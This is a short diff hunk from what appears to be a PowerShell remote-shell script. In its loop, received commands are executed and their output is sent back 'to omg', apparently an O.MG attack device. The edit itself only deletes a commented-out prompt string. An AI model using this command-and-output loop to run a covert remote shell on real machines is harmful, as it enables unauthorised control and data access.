@@ -146,7 +146,7 @@ while ($loop) {
                     Write-Host -ForegroundColor red "[!]Error: Unable to run received command" #Error message in console
                 }
             #Convert output to bytes
-            $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output) #Add prompt later, when solution for client found :  ($output + "OMG@PS $pwd> `n")
+            $outputBytes = [System.Text.Encoding]::ASCII.GetBytes($output)
             $outputLength = $outputBytes.Length
 
             #Send output bytes to omg
